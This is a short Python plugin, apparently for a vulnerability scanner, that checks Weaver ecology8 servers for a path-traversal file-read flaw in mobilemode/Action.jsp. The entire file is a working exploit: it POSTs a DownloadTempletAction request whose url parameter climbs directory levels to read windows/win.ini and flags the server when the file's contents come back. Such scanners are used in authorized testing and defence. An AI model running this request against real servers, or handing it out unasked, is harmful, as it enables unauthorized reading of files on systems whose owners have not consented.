#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):
    """
    ecology8 mobilemode download
    """

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB

    async def prove(self):
        if self.base_url:
            async with ClientSession() as session:
                for path in self.get_url_normpath_list(self.url):
                    if path[-1] == '/':
                        url = path + "mobilemode/Action.jsp"
                        data = 'invoker=com.weaver.formmodel.mobile.servlet.DownloadTempletAction&url=/mobilemode/actiontemplet/../../../../../../../../../../../../../../windows/win.ini'
                        async with session.post(url=url,data=data) as res:
                            if res!=None:
                                text = await res.text()
                                if '[extensions]' in text:
                                    yield url
                                    